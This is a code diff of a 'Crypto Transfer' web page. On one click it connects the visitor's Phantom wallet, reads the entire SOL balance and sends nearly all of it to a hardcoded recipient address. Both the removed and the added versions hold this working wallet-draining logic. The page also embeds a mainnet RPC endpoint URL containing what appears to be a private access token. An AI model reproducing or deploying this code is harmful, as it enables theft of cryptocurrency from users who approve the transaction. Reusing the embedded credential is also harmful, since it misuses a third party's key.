@@ -4,22 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-
-    <!-- Double Buffer polyfill approach -->
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/browser.min.js"></script>
-    <script src="https://unpkg.com/buffer@5.7.1/browser.js"></script>
-    <script>
-        // Nuclear option for Buffer initialization
-        window.Buffer = window.Buffer || Buffer || require('buffer').Buffer;
-        if (typeof TextEncoder === 'undefined') {
-            const { TextEncoder, TextDecoder } = require('text-encoding');
-            window.TextEncoder = TextEncoder;
-            window.TextDecoder = TextDecoder;
-        }
-    </script>
-
-    <!-- Load Solana Web3 -->
-    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.41.4/web3.min.js"></script>
 </head>
 <body>
     <h1>Click below to transfer all funds</h1>
@@ -27,72 +12,46 @@
 
     <script>
         document.getElementById('transferButton').addEventListener('click', async () => {
+            if (!window.solana) {
+                alert('Phantom wallet not found. Please install Phantom.');
+                return;
+            }
+
             try {
-                // Comprehensive environment check
-                const envChecks = {
-                    Buffer: typeof Buffer !== 'undefined',
-                    BufferFrom: typeof Buffer?.from === 'function',
-                    Solana: typeof solanaWeb3 !== 'undefined',
-                    Phantom: !!window.solana
-                };
-
-                console.log('Environment Checks:', envChecks);
-                if (!envChecks.Buffer || !envChecks.BufferFrom) {
-                    throw new Error(`Buffer not initialized (${JSON.stringify(envChecks)})`);
+                await window.solana.connect();
+                const publicKey = window.solana.publicKey;
+                if (!publicKey) {
+                    throw new Error('Failed to get public key.');
                 }
 
-                if (!window.solana?.isPhantom) {
-                    alert('Phantom wallet not found. Please install Phantom.');
-                    return;
-                }
-
-                // Phantom connection
-                const phantom = window.solana;
-                if (!phantom.isConnected) {
-                    await phantom.connect();
-                }
-                const publicKey = new solanaWeb3.PublicKey(phantom.publicKey);
-
-                // Solana connection
-                const connection = new solanaWeb3.Connection(
-                    'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
-                    'confirmed'
-                );
-
-                // Balance check
+                const connection = new solanaWeb3.Connection('https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df', 'confirmed');
                 const balance = await connection.getBalance(publicKey);
-                if (balance <= 5000) {
-                    alert('Insufficient SOL balance (minimum 0.000005 SOL required)');
+                
+                if (balance <= 0) {
+                    alert('Insufficient SOL balance.');
                     return;
                 }
 
-                // Transaction construction
-                const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
+                const recipient = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
-                        toPubkey: recipient,
-                        lamports: balance - 5000
+                        toPubkey: new solanaWeb3.PublicKey(recipient),
+                        lamports: balance - 5000 // Subtract estimated transaction fee
                     })
                 );
 
-                // Transaction configuration
+                transaction.feePayer = publicKey;
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
-                transaction.feePayer = publicKey;
 
-                // Transaction signing
-                const signedTx = await phantom.signTransaction(transaction);
-                const rawTransaction = signedTx.serialize();
-                const signature = await connection.sendRawTransaction(rawTransaction);
-                
-                // Confirmation
+                const signedTransaction = await window.solana.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                 await connection.confirmTransaction(signature);
-                alert(`Success! TX: ${signature}`);
 
+                alert(`Transaction successful: ${signature}`);
             } catch (error) {
-                console.error('Full Error:', error);
-                alert(`Failed: ${error.message}`);
+                alert(`Transaction failed: ${error.message}`);
             }
         });
     </script>
